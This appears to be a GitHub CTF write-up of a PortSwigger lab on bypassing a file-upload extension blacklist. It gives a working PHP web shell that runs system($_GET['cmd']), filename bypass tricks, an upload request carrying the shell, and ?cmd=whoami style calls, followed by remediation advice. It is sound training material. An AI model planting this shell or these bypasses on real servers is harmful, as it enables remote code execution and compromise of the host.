# CTF Writeup — PortSwigger lab: Web shell upload via extension blacklist bypass

> **Lab title:** Web shell upload via extension blacklist bypass

---

## TL;DR

* **Vulnerability type:** Insecure file upload — extension blacklist bypass allows an attacker to upload a web shell and achieve remote code execution (RCE) on the server.
* **Impact:** Full compromise of the web application host (execute arbitrary commands with the privileges of the web server process).
* **Goal / flag:** Upload a web shell, access it, and execute commands (capture the flag / lab success message).

---

## Lab / repo details (for GitHub)

* **Lab URL:** `<<paste PortSwigger lab URL here>>`
* **Repository:** Add this file to your `ctf-writeups` repo as `portswigger-webshell-extension-bypass.md` with screenshots and Burp logs in a `/artifacts` folder.
* **Notes for repo:** Keep sensitive or identifying data out of the public repo (sanitize any attacker domains or external servers you used for exfiltration). Use descriptive commit messages.

---

## Environment & prerequisites

* Burp Suite (Proxy, Repeater, Intruder, Decoder)
* A tiny web shell file (e.g., `shell.php`) or a polyglot file that bypasses extension checks
* (Optional) Local HTTP server to host payloads if the lab requires fetching remote resources

---

## Recon / initial findings

1. **Identify upload functionality:** Locate the page that accepts file uploads (often a profile picture, product image, or file attachment feature).
   <img width="357" height="190" alt="Screenshot 2025-10-06 161329" src="https://github.com/user-attachments/assets/63d50ccb-a134-4a78-bf07-5a44533c8eee" />

2. **Test allowed file types:** Upload common image files (`.jpg`, `.png`) and observe behavior. Attempt to upload a `.php` file — note the server response or error message.
   <img width="697" height="371" alt="Screenshot 2025-10-07 124341" src="https://github.com/user-attachments/assets/b3636237-f0cd-4172-83a6-917a11180f94" />
   <img width="354" height="136" alt="Screenshot 2025-10-07 124424" src="https://github.com/user-attachments/assets/b4439ab2-dc02-4e29-8127-ba9188cd03d6" />
   <img width="695" height="476" alt="Screenshot 2025-10-07 124513" src="https://github.com/user-attachments/assets/4501b4ed-247d-4029-af9f-7bdcd4b5997f" />

3. **Check returned file location:** After upload, where is the file stored? Is it accessible via a URL? Does the application sanitize file names or change the extension?
   
Typical behavior in this lab: the application blocks uploads based on file extension using a blacklist (e.g., blocking `.php`, `.phtml`, `.jsp`), but allows certain e.g. `.php.jpg` or other tricked filenames. The server may rely solely on the filename rather than content-type or file magic bytes.

---

## Vulnerability analysis

* **Why this works:** The server enforces an extension blacklist (deny list) rather than a whitelist. Attackers can bypass this by using creative file names (double extensions), using case variations, or uploading a file with an allowed extension while embedding a server-interpretable payload (e.g., `shell.php.jpg` where the server later interprets the file as PHP due to server configuration or content sniffing).
* **Common bypasses:**

  * Double extensions: `shell.php.jpg`
  * Null byte injection (older servers): `shell.php%00.jpg` (rarely works on modern servers)
  * Uppercase/lowercase trick: `shell.PHP.jpg` or `sheLL.PhP`
  * Content-type mismatch: uploading `image/jpeg` with PHP content
  * File content polyglots: valid image header plus embedded PHP between image markers (e.g., JPEG header + `<?php ... ?>`) so the file both is a valid image and contains server-executable PHP.

---

## Attack plan / methodology

1. **Confirm blacklist enforcement** by trying to upload `.php` and noting the rejection message.
2. **Try double-extension** filenames (e.g., `shell.php.jpg`) and re-check if the server accepts the file and where it stores it.
3. **If stored and accessible**, visit the uploaded file's URL to see if the server executes the embedded PHP or serves it as plain content. If it executes, you have RCE.
4. **If not executed**, try alternative bypasses: case variation, embedded PHP inside a valid image (polyglot), or adjusting Content-Type.
5. **Use a web shell** (simple PHP web shell) to execute commands and retrieve the lab flag.

---

## Payloads and sample web shells

**Simple PHP web shell (for labs only):**

```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

Save as `shell.php` then attempt to upload. If a double-extension is required, rename to `shell.php.jpg`.

**JPEG polyglot technique (toy example)** — prepend JPEG header bytes then the PHP payload. In practice, you can create a valid JPEG and append `<?php ... ?>` near the end.

---

## Example exploitation steps (reproducible)

1. Intercept the upload form with Burp Proxy and submit a file named `shell.php.jpg` that contains:

```
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

2. Observe the server response — note the path/location returned by the server (e.g., `/uploads/avatars/shell.php.jpg`). Save the exact response in Burp for evidence.
3. Open the file URL in your browser: `https://<target>/uploads/avatars/shell.php.jpg?cmd=whoami`.
4. If the server executes PHP in the uploaded file, the command output will appear (e.g., `www-data` or similar). Save a screenshot and the request/response logs.
5. Retrieve the flag or success message (often the lab will present a success page when the shell runs a specific command or you can run `cat /etc/flag` or similar depending on the lab instructions).

---

## Burp workflow tips

* **Proxy** to capture the upload request and response (this gives you the exact storage path).
* **Repeater** to resend the request with different filenames and payloads quickly.
* **Intruder** is useful if you need to brute-force filename variations (case permutations, extension lists) but be cautious.
* Use **Decoder** to build polyglot files (e.g., combine hex JPEG header with PHP payload), then save locally and upload.

---

## Example requests (placeholder)

```
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
------WebKitFormBoundary--
```

Response snippet:

```
{"status":"OK","path":"/uploads/avatars/shell.php.jpg"}
```

Visit: `https://target/uploads/avatars/shell.php.jpg?cmd=uname -a`

---

## Proof / artifacts

Include both raw evidence (requests/responses) and visual proof (screenshots). Store all files in an `/artifacts` folder in your repo. Use clear, descriptive filenames and include a small README in `/artifacts/README.md` that explains what each file is.

**Recommended screenshots and where to place them in the writeup:**

1. **Recon — upload form visible**

   * *Where to add:* under **Recon / initial findings**.
   * *Filename suggestion:* `01_recon_upload_form.png`
   * *Purpose:* show the page that accepts uploads so reviewers can see the input point.

2. **Upload request (intercepted in Burp)**

   * *Where to add:* under **Step-by-step reproduction (example)** — place directly after the example POST request.
   * *Filename suggestion:* `02_burp_upload_request.png`
   * *Purpose:* proves the exact HTTP request used to upload the file (multipart payload, filename used).

3. **Server response showing stored file path**

   * *Where to add:* under **Step-by-step reproduction (example)** after the upload response snippet.
   * *Filename suggestion:* `03_upload_response_path.png`
   * *Purpose:* shows the returned JSON/HTML that indicates where the file was stored (the URL path).

4. **GET to uploaded file showing command execution (web shell output)**

   * *Where to add:* under **Example exploitation steps (reproducible)** — show after the `?cmd=` example.
   * *Filename suggestion:* `04_shell_execution_whoami.png`
   * *Purpose:* visual proof the shell executed server-side commands (e.g., `whoami`, `uname -a`).

5. **Lab success / flag capture**

   * *Where to add:* under **Proof / artifacts** (this exact subsection) and also under **Example exploitation steps** where you describe retrieving the flag.
   * *Filename suggestion:* `05_flag.png`
   * *Purpose:* capture the lab success message or extracted flag.

6. **Polyglot / image-with-php proof (if used)**

   * *Where to add:* under **Payloads and sample web shells** or **Example exploitation steps** near the payload that worked.
   * *Filename suggestion:* `06_polyglot_binary_inspected.png` (or `06_image_with_php.png`)
   * *Purpose:* show a hex dump or local file opened in an editor proving the image contains embedded PHP.

7. **Burp logs / raw HTTP evidence**

   * *Where to add:* under **Proof / artifacts** and include the files in `/artifacts/` (e.g., `burp-requests-upload.txt`, `burp-requests-shell-access.txt`).
   * *Filename suggestion:* `burp-requests-upload.txt`, `burp-requests-shell-access.txt`
   * *Purpose:* canonical evidence of requests/responses for verification.

8. **Server directory listing or uploaded files page (if available)**

   * *Where to add:* under **Recon / initial findings** or **Step-by-step reproduction** if the app lists uploads.
   * *Filename suggestion:* `07_uploads_directory_listing.png`

**How to embed in the Markdown writeup**

* Use relative links so GitHub renders images, e.g. `![Upload form](artifacts/01_recon_upload_form.png)`.
* For Burp text logs use fenced code blocks or attach plain `.txt` files in `/artifacts` and reference them in the writeup.

**Naming & organization tips**

* Prefix files with a two-digit step number (01_, 02_, …) to keep them ordered.
* Keep a short `artifacts/README.md` listing each file and a one-line description.
* If screenshots contain sensitive info (your local IP, tokens), sanitize or redact before committing.

---

## Remediation

* **Use a whitelist for file types** — only allow specific, expected file types (e.g., `.jpg`, `.png`) and validate by file magic bytes rather than filename extensions.
* **Validate file contents** — ensure uploaded files match expected MIME type and content signatures. For images, check image headers and attempt to re-encode/resave the image server-side (e.g., using ImageMagick) to strip any embedded code.
* **Normalize filenames** and avoid storing user-supplied filenames directly. Generate server-side safe filenames and do not allow double extensions to influence behavior.
* **Store uploaded files outside the webroot** or configure the upload directory so uploaded files cannot be executed by the server (serve them via a proxy script that reads files and sets appropriate Content-Type headers).
* **Set strict server configuration** to avoid executing scripts in upload directories (disable PHP execution in upload folders via web server config, e.g., with `Options -ExecCGI` or proper `location` blocks).

---

## Notes for GitHub README

* Add this file as `portswigger-webshell-extension-bypass.md`.
* Create an `/artifacts` folder for Burp logs and screenshots and add a `README` describing what each artifact file contains.
* Include a short `DISCLAIMER.md` that states these are educational labs and the artifacts do not contain sensitive third-party data.

---

## Lessons learned & tips

* Blacklists are brittle — always prefer whitelists and robust content inspection.
* Double extensions and polyglots are common bypass techniques; defend by server-side reprocessing and strict configuration.
* When reporting, include exact request/response pairs and proof of command execution (screenshots + Burp logs).

---

## References

* OWASP file upload security guidelines
* PortSwigger Academy — Insecure file upload labs

---

*Replace `<<placeholders>>` with lab-specific details and paste captured Burp requests/screenshots into your repo.*
